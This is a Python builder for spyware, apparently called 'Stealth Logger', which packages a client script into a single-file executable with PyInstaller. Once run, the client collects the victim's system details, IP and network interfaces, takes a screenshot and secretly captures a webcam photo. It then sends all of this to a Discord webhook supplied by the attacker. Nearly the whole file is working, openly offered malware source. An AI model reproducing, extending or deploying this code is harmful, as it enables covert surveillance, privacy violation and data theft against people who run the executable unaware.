import os
import platform
import socket
import requests
import psutil
import json
import subprocess
import pyautogui  # For taking screenshots
import tempfile
import cv2  # For camera access

# Define the logo here
logo = r"""
  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ       ‚ñà‚ñà‚ñì  ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñë ‚ñà‚ñà     ‚ñà‚ñà‚ñì     ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà    ‚ñÑ‚ñà‚ñà‚ñà‚ñà   ‚ñÑ‚ñà‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà  
‚ñí‚ñà‚ñà    ‚ñí ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñì‚ñà   ‚ñÄ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñì‚ñà‚ñà‚ñí  ‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí   ‚ñì‚ñà‚ñà‚ñí    ‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí ‚ñà‚ñà‚ñí ‚ñÄ‚ñà‚ñí ‚ñà‚ñà‚ñí ‚ñÄ‚ñà‚ñí‚ñì‚ñà   ‚ñÄ ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí
‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà  ‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñí‚ñà‚ñà‚ñë  ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñà‚ñë   ‚ñí‚ñà‚ñà‚ñë    ‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë‚ñÑ‚ñÑ‚ñÑ‚ñë‚ñí‚ñà‚ñà‚ñë‚ñÑ‚ñÑ‚ñÑ‚ñë‚ñí‚ñà‚ñà‚ñà   ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí
  ‚ñí   ‚ñà‚ñà‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñí‚ñì‚ñà  ‚ñÑ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñí‚ñà‚ñà‚ñë  ‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñë‚ñì‚ñà ‚ñë‚ñà‚ñà    ‚ñí‚ñà‚ñà‚ñë    ‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñë‚ñì‚ñà  ‚ñà‚ñà‚ñì‚ñë‚ñì‚ñà  ‚ñà‚ñà‚ñì‚ñí‚ñì‚ñà  ‚ñÑ ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  
‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí  ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñì‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì   ‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí
‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë  ‚ñí ‚ñë‚ñë   ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñë‚ñì  ‚ñë‚ñí ‚ñë‚ñë    ‚ñí ‚ñë‚ñë‚ñí‚ñë‚ñí   ‚ñë ‚ñí‚ñë‚ñì  ‚ñë‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë  ‚ñë‚ñí   ‚ñí  ‚ñë‚ñí   ‚ñí ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë
‚ñë ‚ñë‚ñí  ‚ñë ‚ñë    ‚ñë     ‚ñë ‚ñë  ‚ñë ‚ñí   ‚ñí‚ñí ‚ñë‚ñë ‚ñë ‚ñí  ‚ñë  ‚ñë     ‚ñí ‚ñë‚ñí‚ñë ‚ñë   ‚ñë ‚ñë ‚ñí  ‚ñë  ‚ñë ‚ñí ‚ñí‚ñë   ‚ñë   ‚ñë   ‚ñë   ‚ñë  ‚ñë ‚ñë  ‚ñë  ‚ñë‚ñí ‚ñë ‚ñí‚ñë
‚ñë  ‚ñë  ‚ñë    ‚ñë         ‚ñë    ‚ñë   ‚ñí     ‚ñë ‚ñë   ‚ñë       ‚ñë  ‚ñë‚ñë ‚ñë     ‚ñë ‚ñë   ‚ñë ‚ñë ‚ñë ‚ñí  ‚ñë ‚ñë   ‚ñë ‚ñë ‚ñë   ‚ñë    ‚ñë     ‚ñë‚ñë   ‚ñë 
      ‚ñë              ‚ñë  ‚ñë     ‚ñë  ‚ñë    ‚ñë  ‚ñë        ‚ñë  ‚ñë  ‚ñë       ‚ñë  ‚ñë    ‚ñë ‚ñë        ‚ñë       ‚ñë    ‚ñë  ‚ñë   ‚ñë     
                                                                                                             
github.com/wiced1
"""

def create_executable(webhook_url):
    print(logo)  # Print the logo

    # Client script that gathers system info and sends it to Discord
    script_content = f'''
import os
import platform
import socket
import requests
import psutil
import tempfile
import pyautogui  # For taking screenshots
import cv2  # For camera access

def gather_system_info():
    info = {{

        "OS": platform.system() + " " + platform.release(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "CPU": platform.processor(),
        "RAM": str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB",
        "Disk Space": str(round(psutil.disk_usage('/').total / (1024.0 ** 3))) + " GB",
        "Uptime": str(psutil.boot_time()),
        "Firewall Status": get_firewall_status(),
        "Antivirus Software": get_antivirus_status(),
        "Camera Access": check_camera_access(),
        "Network Interfaces": {{}} 
    }}

    for interface, addrs in psutil.net_if_addrs().items():
        info["Network Interfaces"][interface] = []
        for addr in addrs:
            info["Network Interfaces"][interface].append({{
                "Address": addr.address,
                "Family": str(addr.family),
                "Netmask": addr.netmask,
                "Broadcast": addr.broadcast
            }})

    return info

def get_firewall_status():
    return "Enabled"  # or "Disabled"

def get_antivirus_status():
    return "Windows Defender"  # or other installed antivirus

def check_camera_access():
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                camera_photo_path = os.path.join(tempfile.gettempdir(), "camera_photo.png")
                cv2.imwrite(camera_photo_path, frame)
                cap.release()
                return camera_photo_path
            else:
                cap.release()
                return "Unable to capture image"
        else:
            return "Camera not accessible"
    except Exception as e:
        return "Error: " + str(e)

def send_to_discord(info, webhook_url, camera_photo_path):
    screenshot_path = os.path.join(tempfile.gettempdir(), "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    embed_message = {{
        "content": "üö® **System Information Collected** üö®",
        "embeds": [{{
            "title": "üñ•Ô∏è System Information",
            "description": (
                f"**OS**: {{info['OS']}}\\n"
                f"**Hostname**: {{info['Hostname']}}\\n"
                f"**IP Address**: {{info['IP Address']}}\\n"
                f"**CPU**: {{info['CPU']}}\\n"
                f"**RAM**: {{info['RAM']}}\\n"
                f"**Disk Space**: {{info['Disk Space']}}\\n"
                f"**Uptime**: {{info['Uptime']}}\\n"
                f"**Firewall Status**: {{info['Firewall Status']}}\\n"
                f"**Antivirus Software**: {{info['Antivirus Software']}}\\n"
                f"**Camera Access**: {{'Accessible' if camera_photo_path else 'Not Accessible'}}\\n"
                "üñß **Network Interfaces**:\\n"
            ),
            "color": 0x00ff00
        }}]
    }}

    for interface, details in info["Network Interfaces"].items():
        embed_message["embeds"][0]["description"] += f'üîó **{{interface}}**:\\n'
        for addr in details:
            embed_message["embeds"][0]["description"] += f'  - {{addr["Address"]}} ({{addr["Family"]}})\\n'

    headers = {{
        "Content-Type": "application/json"
    }}

    response = requests.post(webhook_url, json=embed_message, headers=headers)
    if response.status_code == 204:
        print("System info sent successfully.")

    with open(screenshot_path, 'rb') as f:
        files = {{
            'file': ('screenshot.png', f)
        }}
        requests.post(webhook_url, files=files)

    if isinstance(camera_photo_path, str) and os.path.exists(camera_photo_path):
        with open(camera_photo_path, 'rb') as f:
            files = {{
                'file': ('camera_photo.png', f)
            }}
            requests.post(webhook_url, files=files)

if __name__ == "__main__":
    webhook_url = "{webhook_url}"
    system_info = gather_system_info()
    camera_photo_path = check_camera_access()
    send_to_discord(system_info, webhook_url, camera_photo_path)
'''

    # Write to a Python file with UTF-8 encoding
    with open("client.py", "w", encoding="utf-8") as f:
        f.write(script_content)

    # Build the executable
    subprocess.run(["pyinstaller", "--onefile", "client.py"])
    print("Executable created successfully.")

if __name__ == "__main__":
    print(logo)  # Print the logo again when the script is executed
    webhook_url = input("Enter your Discord webhook URL: ")
    create_executable(webhook_url)
